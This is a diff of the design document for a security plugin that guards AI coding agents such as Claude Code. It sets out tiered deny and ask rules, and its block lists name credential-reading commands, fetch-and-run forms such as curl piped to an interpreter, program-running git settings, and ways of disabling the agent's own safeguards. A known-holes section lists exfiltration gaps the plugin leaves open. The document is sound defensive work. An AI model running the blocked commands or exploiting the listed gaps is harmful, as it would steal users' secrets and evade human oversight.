@@ -8,8 +8,8 @@ solana-ai-kit ([ai-kit#264](https://github.com/solanabr/ai-kit/issues/264)) and 
 
 | Owner | Owns |
 |---|---|
-| solana-ai-kit | The OS sandbox (filesystem denies, `deniedDomains` at the syscall), permission rules, tier selection and regeneration (`/firewall`, `.claude/security.json`), git/publish/fetch-and-execute/`gh` gates, MCP tool-name denies |
-| safe-ai-skill | Solana-semantic gates (cluster, amounts, irreversible and authority actions, mainnet, grants); secrets for plugin-only users (key material and home stores hard-denied; project `.env` reads and writes by tier, as the kit does; the `env` CLI, varlock and redaction); supply chain (scan, pins, Skill/slash deny, no moves); the tier as an **input**; a best-effort exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) and the tamper, download-and-run, env-dump and encoded-command gates (see [Tripwire gates by tier](#tripwire-gates-by-tier)) |
+| solana-ai-kit | The OS sandbox (filesystem denies, `deniedDomains` at the syscall), permission rules, tier selection and regeneration (`/firewall`, `.claude/security.json`), and its own hooks for git, publish, fetch-and-execute and `gh`. This plugin now carries hook-level counterparts for the git and `gh`, fetch-and-execute and MCP tool-name rules (below), kept as defence in depth; the publish gate is not covered here |
+| safe-ai-skill | Solana-semantic gates (cluster, amounts, irreversible and authority actions, mainnet, grants); secrets for plugin-only users (key material and home stores hard-denied; project `.env` reads and writes by tier, as the kit does; the `env` CLI, varlock and redaction); supply chain (scan, pins, Skill/slash deny, no moves); the tier as an **input**; a best-effort exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) and the git and `gh`, tamper, download-and-run, env-dump, encoded-command and MCP tool-name gates (see [Tripwire gates by tier](#tripwire-gates-by-tier)); a settings manager that writes the sandbox and permission block ([`firewall`](#settings-manager)) |
 | Shared | Versioned list files in `policy/shared/` (`credentials.list`, `exfil-hosts.list`, `onchain-verbs.list`), a conformance corpus and one headless rule |
 
 Defence in depth is kept only where the mechanisms differ (a hook against a syscall, a Rust parser against an awk one). The plugin does not reimplement sandbox semantics and does not promise what only a sandbox can do.
@@ -148,7 +148,9 @@ One shared list, `credentials.list`, with the classes `key_material`, `host_toke
 - **Surfaces:** Read, file Grep, directory Grep, MCP path arguments, and any Bash command naming a store (metadata-only commands such as `ls`, `stat` and `test` excepted; a `NAME=<store path>` assignment counts). Glob lists names only and stays ungated.
 - **SSH identities:** `ssh`, `scp` and `sftp` may name a key under `~/.ssh` as their identity (`-i <key>`, `-o IdentityFile=<key>`), and `ssh-keygen -y -f <key>` may print its public key: the key is used, not printed. Any other use of a private key path (`scp ~/.ssh/id_rsa host:`, `cat`, `ssh-add`) is denied. Solana signers may name a keypair under `~/.config/solana` or a `*-keypair.json`; the on-chain gates own those commands.
 - **Directory Grep:** exclusion globs for every credential class are appended to its `glob`. A Grep rooted at or above `$HOME` gets all of them (this closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents). A Grep rooted inside a credential store is denied.
-- **Command-form readers** (plugin-internal, not path globs): `gh auth token`, `git credential fill`, `security find-generic-password -w` and `find-internet-password -w`, `aws configure get *secret*` and `export-credentials`, `npm config get *_authToken`, `docker-credential-* get`, `secret-tool lookup`, `pass show`, `op read`, `bw get`.
+- **Moved and linked stores.** A store that an environment variable relocates is protected at its new place: `GH_CONFIG_DIR`, `DOCKER_CONFIG`, `CARGO_HOME`, `AWS_SHARED_CREDENTIALS_FILE`, `AWS_CONFIG_FILE`, `KUBECONFIG`, `NPM_CONFIG_USERCONFIG`, `NETRC`, `GNUPGHOME`, `PASSWORD_STORE_DIR`, `CLOUDSDK_CONFIG`, `AZURE_CONFIG_DIR`, and `XDG_CONFIG_HOME` for every `~/.config/…` store. The hook reads these from its own environment, not from an assignment typed in the command. A single-file store is also recognised through a hard link (same device and inode), whatever the link is called or where it sits. The macOS Bitwarden desktop data directory is a store too.
+- **MCP path arguments.** A `path` argument of an MCP tool that would let a recursive reader (context-mode's indexer, a filesystem server's search) reach a store is denied: the path is at or above a store, or an immediate child is a symlink into one. A link nested deeper is a residual.
+- **Command-form readers** (plugin-internal, not path globs): `gcloud auth print-access-token` and `print-identity-token` (also under `application-default`), `gcloud config config-helper`, `az account get-access-token`, `gh auth token`, `git credential fill`, `security find-generic-password -w` and `find-internet-password -w`, `aws configure get *secret*` and `export-credentials`, `npm config get *_authToken`, `docker-credential-* get`, `secret-tool lookup`, `pass show`, `op read`, `bw get`.
 - **`~/.ssh/**`:** `config`, `known_hosts` and `*.pub` are readable; private keys and `authorized_keys` stay denied.
 - **Transcripts:** `~/.claude/projects/**` (and `$CLAUDE_CONFIG_DIR/projects`) and the plugin's state key are read-denied, through Read, Grep and Bash. A custom `$CLAUDE_CONFIG_DIR` (as the hook process has it) is protected like `~/.claude`: a Grep rooted in its `projects/` denies, a Grep over it or above it excludes its transcripts and credentials file, and a Bash word spelling `$CLAUDE_CONFIG_DIR` or `${CLAUDE_CONFIG_DIR}` is expanded before it is judged. **This also stops the agent reading its own auto-memory files** (`~/.claude/projects/<project>/memory/…`) with its tools. That is deliberate: the deny covers the whole `~/.claude/projects/**` tree, which also holds the transcripts that record hook messages, and there is no carve-out for the memory subdirectory. Open those files yourself.
 - `~` means the passwd home and `$HOME` (`%USERPROFILE%` on Windows), and matching is case-insensitive on macOS and Windows, on both the path as typed and the symlink-resolved path.
@@ -167,7 +169,21 @@ Gates that judge command text, tool arguments or file content rather than a path
 | Exfil: `git push` to a URL or a remote added or re-pointed on the same line, host not a developer service | ask | ask | ask | ask |
 | Exfil: browser script that reads cookies or storage and calls a network sink | ask | ask | ask | ask |
 | Tamper: a write that turns protection off (settings, agent definition) | deny | deny | deny | deny |
-| Tamper: git hook, risky git config, `.mcp.json` server, lifecycle script, kit hook or tier, `KIT_FIREWALL_*`/`SAFE_AI_SKILL_*` export, or a write whose content is not shown | ask | ask | ask | ask |
+| Tamper: plain `claude` with a permission-weakening flag, `claude mcp add`, `claude setup-token`, `claude plugin disable\|uninstall` of safe-ai-skill (through a package runner or a path: deny from Relaxed, no opinion at Off) | deny | deny | deny | deny |
+| Tamper: write to a file that runs code on the next shell, build or login, to managed settings, or to a project's `.safe-ai-skill/` (not `policy.yaml`) | deny | deny | deny | deny |
+| Tamper: write to the user-scope Claude Code dirs under `~/.claude` (agents, commands, skills, plugins, rules, schedules, shell snapshots) or `~/.claude/.credentials.json` | n/o | n/o | n/o | deny |
+| ConfigChange: a settings change that turns protection off (Claude Code only) | block | block | block | block |
+| Tamper: git hook, risky git config (a `git config` or `-c` form is a deny from Medium, see the git rows), `.mcp.json` server, lifecycle script, kit hook or tier, `KIT_FIREWALL_*`/`SAFE_AI_SKILL_*` export, or a write whose content is not shown | ask | ask | ask | ask |
+| Git: `clean`, work-tree `restore`, `checkout --`, `reset --hard`, `reflog expire`, `prune`, `gc --prune`, `push --mirror`; `--config-env`, `GIT_CONFIG_*`/`GIT_EXEC_PATH`; `--upload-pack`/`--receive-pack`/`--exec` | deny | deny | deny | deny |
+| Git: force push, `gh pr merge` | n/o | n/o | ask | deny |
+| Git: rebase, `commit --amend`, `filter-branch`, delete a branch, tag or stash; `GIT_SSH_COMMAND`, `GIT_ASKPASS` and similar | n/o | n/o | n/o | ask |
+| Git: `git config` or `-c` of a key that runs a program | ask | ask | deny | deny |
+| `gh secret set`, `gh variable set`, `gh repo delete`, `gh issue delete`, `gh alias`, `gh api` write to secrets or variables | deny | deny | deny | deny |
+| `gh api` write to workflow dispatches, deployments or environments | ask | ask | deny | deny |
+| `gh api`, any other call | n/o | n/o | deny | deny |
+| MCP tool refused by name: context-mode `ctx_execute`, `ctx_execute_file`, `ctx_batch_execute`, `ctx_fetch_and_index`, `ctx_index`; Playwright `browser_run_code_unsafe`, `browser_network_request` | n/o | n/o | deny | deny |
+| MCP tool refused by name: Playwright `browser_evaluate`, Cloudflare `execute` | n/o | n/o | n/o | deny |
+| `cargo install`/`binstall` of an undeclared crate, `go install`/`go run pkg@version` of a module not in `go.mod`, `uv run --with` of an undeclared package | n/o | n/o | n/o | deny |
 | Download-and-run, undeclared one-shot runner, `cargo install --git` outside the allowlist, mainnet Node script | ask | ask | ask | deny |
 | Env dump: `/proc/*/environ`, `ps e`, printing a secret-named variable | deny | deny | deny | deny |
 | Env dump: bare `printenv`/`env`/`export -p`/`set`/`declare -p` (values blanked in the output) | n/o | n/o | n/o | n/o |
@@ -233,7 +249,7 @@ and in an agent definition, `permissionMode: bypassPermissions` in its front mat
 **Ask** (a deny when headless):
 
 - a git hook (`.git/hooks/<name>`, or a `chmod` of one);
-- a git setting that makes git run a program, written to `.git/config` or set by `git config` or a one-shot `git -c key=value`: `core.hooksPath`, `core.sshCommand`, `core.gitProxy`, `core.askpass`, `core.fsmonitor` (a program, not `true`/`false`), `diff.external`, `gpg.program`, `gpg.ssh.program`, `gpg.x509.program`, `uploadpack.packObjectsHook`, `include.path` and `includeIf.*.path`, an `alias.*` starting with `!`, `filter.*`, `diff.*.textconv`/`command` and `merge.*.driver` settings, `pager.*`, and a `credential.helper` that starts with `!` or holds a path. `core.editor`, `core.pager` and `sequence.editor` pass when the value is a known bare editor or pager (`vim`, `vi`, `nvim`, `nano`, `emacs`, `code --wait`, `subl -w`, `less`, `more`, `cat`, `delta`);
+- a git setting that makes git run a program, written to `.git/config` or set by `git config` or a one-shot `git -c key=value` (the [git guard](#git-and-gh-guard) denies the `git config` and `-c` forms from Medium): `core.hooksPath`, `core.sshCommand`, `core.gitProxy`, `core.askpass`, `core.fsmonitor` (a program, not `true`/`false`), `diff.external`, `gpg.program`, `gpg.ssh.program`, `gpg.x509.program`, `uploadpack.packObjectsHook`, `include.path` and `includeIf.*.path`, an `alias.*` starting with `!`, `filter.*`, `diff.*.textconv`/`command` and `merge.*.driver` settings, `pager.*`, and a `credential.helper` that starts with `!` or holds a path. `core.editor`, `core.pager` and `sequence.editor` pass when the value is a known bare editor or pager (`vim`, `vi`, `nvim`, `nano`, `emacs`, `code --wait`, `subl -w`, `less`, `more`, `cat`, `delta`);
 - a new or changed server in `.mcp.json`;
 - a new or changed npm lifecycle script in `package.json` (`preinstall`, `install`, `postinstall`, `prepare`, `prepublishOnly`, … also through `npm pkg set scripts.<name>`);
 - a kit hook script, and a lower tier in `.claude/security.json` (or deleting that file);
@@ -241,11 +257,23 @@ and in an agent definition, `permissionMode: bypassPermissions` in its front mat
 - a Bash write to one of these files whose content the command line does not show (`sed -i` it cannot emulate, `cp` from an unreadable file, `python -c`), a hard link to one, and code that writes a file and builds a path under `.claude`;
 - a NotebookEdit aimed at one of these files (a notebook cannot sensibly write a config file).
 
+**Nested Claude Code and `claude` subcommands.** A `claude` launched with a flag that weakens the session's policy (`--dangerously-skip-permissions`, `--permission-mode`, `--permission-prompt-tool`, `--settings`, `--setting-sources`, `--allowedTools`, `--add-dir`, `--mcp-config`, `--plugin-dir`, `--plugin-url`), `claude mcp add` and `claude setup-token` are denied at every tier when spelled as the plain command. Through a package runner, an explicit path, a JS runtime or `$(which claude)`, with the extra flags `--disallowedTools`, `--strict-mcp-config` and `--allow-dangerously-skip-permissions`, or with a `CLAUDE_CONFIG_DIR=` assignment, they are denied from Relaxed (no opinion at Off). `claude plugin disable|uninstall` of safe-ai-skill is denied at every tier. A `claude -p` that does none of this asks (a deny at High). `claude --version`, `claude mcp list` and similar read-only use are untouched.
+
+**Files that run code later, denied at every tier whatever the write says:**
+
+- files that run on the next shell, build or login: shell startup files (`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, fish `config.fish` and `conf.d/`), `~/.cargo/config(.toml)` and a project's `.cargo/config(.toml)`, `~/.gitconfig` and `~/.config/git/config`, launch agent and daemon directories, and `~/.config/autostart`;
+- an administrator's managed-settings file (`managed-settings.json` under `/Library/Application Support/ClaudeCode` or `/etc/claude-code`);
+- a project's `.safe-ai-skill/` directory, except `policy.yaml`, which can only tighten and stays editable.
+
+**Denied at High only:** Claude Code's user-scope policy surface under `~/.claude` (or `$CLAUDE_CONFIG_DIR`): `agents`, `commands`, `skills`, `rules`, `output-styles`, `plugins`, `workflows`, `routines`, `shell-snapshots`, `local`, plus `scheduled_tasks.json`, `loop.md`, `daemon.json`, `launch.json` and the `.credentials.json` token file (which is also read-denied at every tier). `~/.claude/CLAUDE.md` and the auto-memory files are not in this set.
+
+**`ConfigChange` guard (Claude Code only).** The plugin registers a `ConfigChange` hook (`gate-config`) for user, project and local settings. Claude Code sends the source and file path, not the new text, so the guard reads the file as it now is and blocks the change only when the result turns protection off by the same rule as the settings deny above. It cannot see a removal (it has no earlier text to compare), a file that already disables protection blocks every later change to it until the switch is removed, `policy_settings` changes (which Claude Code never lets a hook block) get no opinion, and neither Codex nor opencode has this event. The sanctioned way to turn safe-ai-skill down is the CLI and its confirmation code.
+
 Residuals are the tripwire's: variable indirection, a script written in one call and run in a later one, a write through a hard link that already exists (creating a link to one asks, above), and an encoded write whose decoded target does not itself name the protected path. A decoded command that does name it is judged ([Encoded commands](#encoded-commands)). A sandbox `denyWrite` on `.claude/settings*.json` is the control.
 
 ## Download and run
 
-`gates/fetchexec.rs` asks about code fetched from the internet and run in the same command line. Every finding asks, denies at High, and is a deny when headless. The `curl … | sh` and `bash <(curl …)` forms are the secrets gate's; this gate adds:
+`gates/fetchexec.rs` asks about code fetched from the internet and run in the same command line. Every finding in the list below asks, denies at High, and is a deny when headless. The `curl … | sh` and `bash <(curl …)` forms are the secrets gate's; this gate adds:
 
 - a download written to a file that a later command runs (`curl -o i.sh URL && bash i.sh`, `wget URL/x && chmod +x x && ./x`);
 - a download piped into, or fed by process substitution to, an interpreter that reads its program from standard input (`curl URL | python3 -`, `node <(curl URL)`), and `bash -c "$(curl URL)"` or `eval` of a fetched script;
@@ -254,7 +282,39 @@ Residuals are the tripwire's: variable indirection, a script written in one call
 - `cargo install --git` of a repository outside the allowlisted organizations;
 - a Node script (`node`, `ts-node`, `tsx`, `bun`, `deno`, directly or behind a runner) run while the command line, `ANCHOR_PROVIDER_URL` or `Anchor.toml` names mainnet.
 
-The allowlists are constants in `gates/fetchexec.rs`: runner packages `create-solana-dapp`, `create-next-app`, `@stbr/safe-ai-skill`, `helius-mcp` and `helius-cli`, and the scopes `@solana/`, `@solana-developers/`, `@coral-xyz/` and `@metaplex-foundation/`; `cargo install --git` organizations `solana-labs`, `anza-xyz`, `coral-xyz` and `solana-foundation`; installer hosts `release.anza.xyz`, `release.solana.com`, `solana-install.solana.workers.dev`, `sh.rustup.rs` and `static.rust-lang.org`, whose downloads are left alone. The first three bullets follow `supply_chain.exec_install_scripts`: `deny` denies them at every tier, `allow` gives them no opinion. The runner, `cargo` and mainnet-script findings always ask.
+The allowlists are constants in `gates/fetchexec.rs`: runner packages `create-solana-dapp`, `create-next-app`, `@stbr/safe-ai-skill`, `helius-mcp` and `helius-cli`, and the scopes `@solana/`, `@solana-developers/`, `@coral-xyz/` and `@metaplex-foundation/`; `cargo install --git` organizations `solana-labs`, `anza-xyz`, `coral-xyz` and `solana-foundation`; installer hosts `release.anza.xyz`, `release.solana.com`, `solana-install.solana.workers.dev`, `sh.rustup.rs` and `static.rust-lang.org`, whose downloads are left alone.
+
+**High adds three more**, which have no opinion at Relaxed and Medium and are denied at High (and so headless):
+
+- `cargo install` or `cargo binstall` of a registry crate the project does not declare (`Cargo.toml` dependencies or `Cargo.lock`) and that is not on the kit's short list (`shank-cli`); at High only the Anchor version manager from the Solana Foundation's repository passes `--git`;
+- `go install` or `go run` of `pkg@version` when the module is not required by the project's `go.mod` (without `@version`, Go only builds local code);
+- `uv run --with <pkg>` of a package the project's Python manifests do not declare (a bare `uv run` uses the project's own dependencies).
+
+They are read behind wrappers (`nice`, `flock`, `timeout`, `sudo`) and across line continuations. The High allowlists are narrower than the runner allowlists above and are constants in `gates/fetchexec.rs`.
+
+The first three bullets follow `supply_chain.exec_install_scripts`: `deny` denies them at every tier, `allow` gives them no opinion. The runner, `cargo` and mainnet-script findings always ask.
+
+## Git and gh guard
+
+`gates/gitguard.rs` judges `git` and `gh` commands in `gate-bash-secrets` (so also under Codex and opencode, where an `ask` is a deny). It reads positions from the shell parser, so a commit message or an issue body that merely names a command is data. Git is recognised behind global options, wrappers and quoting, so a prefix runner or an option in front of the subcommand does not make it a different command. Off acts as Relaxed.
+
+| What | Off / Relaxed | Medium | High |
+|---|---|---|---|
+| Work or history destroyed without a way back: `clean` (not a dry run), `restore` of the work tree, `checkout --`, `reset --hard`, `reflog expire`/`delete`, `prune`, `gc --prune`, `push --mirror` | deny | deny | deny |
+| Force push (any spelling that discards remote commits), `gh pr merge` | no opinion | ask | deny |
+| History rewrites: `rebase` (not abort or continue), `commit --amend`, `filter-branch`/`filter-repo`, deleting a branch, tag or stash | no opinion | no opinion | ask |
+| Making git run a program through its transport or environment: `--config-env`, `--exec-path`, `GIT_CONFIG_COUNT` and its siblings, `GIT_EXEC_PATH`, `--upload-pack`, `--receive-pack`, `--exec` | deny | deny | deny |
+| Credential and transport helpers set from the environment (`GIT_SSH_COMMAND`, `GIT_SSH`, `GIT_PROXY_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_ASKPASS`) | no opinion | no opinion | ask |
+| `git config` or `git -c` of a key that runs a program (`core.hooksPath`, `alias.*`, `core.pager`, `credential.helper` and the rest of the tamper list above), or `config --edit` | ask | deny | deny |
+| `gh secret set`, `gh variable set`, a `gh api` write to secrets or variables, `gh repo delete`, `gh issue delete`, `gh alias` | deny | deny | deny |
+| `gh api` write to workflow dispatches, deployments or environments | ask | deny | deny |
+| `gh api`, any other call | no opinion | deny | deny |
+
+Strings that git itself runs as shell code, `git submodule foreach CMD` and `git rebase --exec CODE`, are judged as commands too, through every Bash gate. Wrapper programs (`timeout`, `nice`, `sudo`, `xargs`, `env` and similar) are looked through.
+
+**Usability floor.** These pass silently at every tier: `git push` (not forced), `commit`, `pull`, `fetch`, `status`, `log`, `diff`, `checkout -b`, `switch`, `stash` and `stash pop`, `reset --soft` and `reset HEAD <file>`, `restore --staged`, `clean -n`/`--dry-run`, `rebase --abort`/`--continue`, `gc`, and read-only `gh pr`, `gh run` and `gh secret list`.
+
+**Not seen:** a subcommand or `gh api` endpoint held in a variable, text the shell assembles at run time, git run from a script file, and environment assignments inside a here-document or a double-quoted substitution. The settings manager's sandbox block excludes `git push`, `pull` and `fetch` (and `gh pr`, `run`, `issue`) from the sandbox so they can authenticate, so for those the hook sees what the sandbox does not.
 
 ## Environment dumps
 
@@ -283,6 +343,7 @@ Residuals: a value copied to an innocently named variable first (`k=$HELIUS_API_
 
 - The sensitive-name pattern is `mcp.sensitive_name_pattern` in `default.policy.yaml`: `transfer|sign|swap|send|withdraw|burn|pay|upgrade|stake|delegate|mint|bridge|lend|borrow|trade|buy|sell|drain|deposit|execute|submit|authority|launch|deploy|close|unstake|deactivate`. `deposit`, `execute`, `submit`, `authority`, `launch`, `deploy` and `close` count only on a tool whose name or action also carries a wallet, Solana or DeFi token (`wallet`, `solana`, `spl`, `defi`, `jupiter`, `raydium`, `phantom`, `helius`, `metaplex`, `onchain`, `web3`, …), since elsewhere they are everyday names (`browser_close`, `close_issue`, `ctx_execute`). A leading read verb on the routed action (`get`, `list`, `fetch`, …) takes the words after it out of the match, so `getStakeAccounts` is a read.
 - **Staking and delegation** (`stake`, `unstake`, `delegate`, `deactivate`) are hard guards: no grant covers them. So are **token transfers** (a `token` token beside `transfer` or `send`), whose amount is in token units, and any value-moving call whose SOL amount cannot be read or is given twice with different values.
+- **Tool-name denies** (`NAME_RULES` in `gates/mcp.rs`, from the kit's rules) refuse a tool by name, whatever its arguments, as a hard guard that no grant lifts. From **Medium**: context-mode's `ctx_execute`, `ctx_execute_file`, `ctx_batch_execute`, `ctx_fetch_and_index` and `ctx_index`, and Playwright's `browser_run_code_unsafe` and `browser_network_request`. At **High** also Playwright's `browser_evaluate` and Cloudflare's `execute`. Off and Relaxed refuse nothing by name and rely on the content checks. The server segment matches as added (`mcp__context-mode__…`) or under a plugin prefix (`mcp__plugin_<plugin>_context-mode__…`); a server that merely contains the name does not match.
 - Every such call asks, and denies at High (an MCP call names no cluster). The exfil tripwire (above) also reads `url`, `uri` and `href` arguments and browser script code.
 
 ## Encoded commands
@@ -302,6 +363,22 @@ Grading, state v2, pins, `packs.lock`, trust and approve are unchanged; only the
 - **Nothing is moved by default at any tier.** `supply_chain.on_block: move` is opt-in, never touches a git-tracked pack or a submodule path (it reads `.gitmodules` and `.git/index` and never runs git; an index it cannot read counts as tracked), and prints the origin and the restore command.
 - At High, SessionStart prints one line, `tier high denies N skill pack(s): <names> — run safe-ai-skill verify trust <pack dir>`, listing the unreviewed HIGH packs it now denies.
 
+## Settings manager
+
+A plugin cannot ship `sandbox` or `permissions` settings, so the protections that need them exist only if a user-run command writes them. `safe-ai-skill firewall` does that from the tier:
+
+```bash
+safe-ai-skill firewall apply [off|relaxed|medium|high] [--project] [--dry-run]
+safe-ai-skill firewall show
+safe-ai-skill firewall check
+```
+
+- **What it writes.** A block of deny rules and sandbox restrictions for the tier into the project's `.claude/settings.local.json` (at the main checkout's root for a linked worktree): `sandbox.enabled: true` from Relaxed up, credential, browser-store, shell-history and persistence-file denies, the exfil host list as `sandbox.network.deniedDomains`, and the carve-outs a sandbox needs to be usable. Medium adds host credentials and Claude transcripts; High adds a `Bash(bash -c *)` permission deny (ai-kit writes it from Medium), a `~/` read fence with allow entries for the project, temp dirs and toolchain caches, and `permissions.blockReadsOutsideWorkingDirectories`. The Solana CLI config dir is never sandbox-read-denied, because sandboxed `solana` and `anchor` must sign.
+- **What it never does.** It never writes `sandbox.enabled: false` (at Off it removes what it added instead), only adds denies and restrictions, and leaves every rule and key you wrote where it is. It owns only the entries it recorded writing; the record is a MAC'd state file in the data dir, not a key in your settings file. The write is atomic and refuses a symlinked `.claude` dir or settings file.
+- **Raising and lowering.** Raising applies at once. Lowering below the tier last applied (or below the user tier when a tier is named) is parked and needs the confirmation code, like `safe-ai-skill tier`.
+- **Drift and resync.** `firewall check` compares the declared tier and the recorded entries with the live file and exits non-zero on drift; at SessionStart a short drift note appears for a project where `apply` was run (nothing is said for a project where it never was), and an older rule-set version, or a declared tier above the enforced one, is re-applied. SessionStart never lowers.
+- **Caveats printed by `apply`.** At High, Claude Code ignores `allowRead` and `allowWrite` from repository settings, and counts `settings.local.json` as repository settings outside a git repository or when git tracks it, so the toolchain carve-outs do not apply and cargo or anchor can fail to read their caches; add them to `~/.claude/settings.json` if they do. A managed `sandbox.enabled: false` outranks this file, and on a platform where Claude Code cannot run its sandbox only the permission rules apply.
+
 ## Headless
 
 One rule, shared with the kit.
@@ -315,6 +392,8 @@ One rule, shared with the kit.
 ## Known holes
 
 The list of what this layer cannot close, and which of them the kit's sandbox and permission rules close, is in [SECURITY.md](../SECURITY.md#known-holes). Specific to this plugin's redaction: failed tool results (non-zero Bash exits, tool errors) reach the model unredacted, because Claude Code lets a hook replace only a successful result. One cost is deliberate and not a hole: the agent cannot read its own auto-memory with its tools (see [Key material and home credential stores](#key-material-and-home-credential-stores)).
+
+The full-coverage work leaves these open, as not yet covered rather than as design limits: destructive and system commands (shutdown, mass deletes beyond the wallet gates), process kill, the publish gate (`npm publish`, `cargo publish`), `docker` cleanup, and reads of shell history files (the settings manager's sandbox `denyRead` covers history for sandboxed commands). Three exfil items: an interpreter one-liner that sends a key file, an inline POST to an unknown host (it asks, at every tier, and is not denied at High), and an environment variable read inside a URL (`curl https://h/?k=$KEY`), which has no opinion at High.
 
 ## Migration from profiles
 
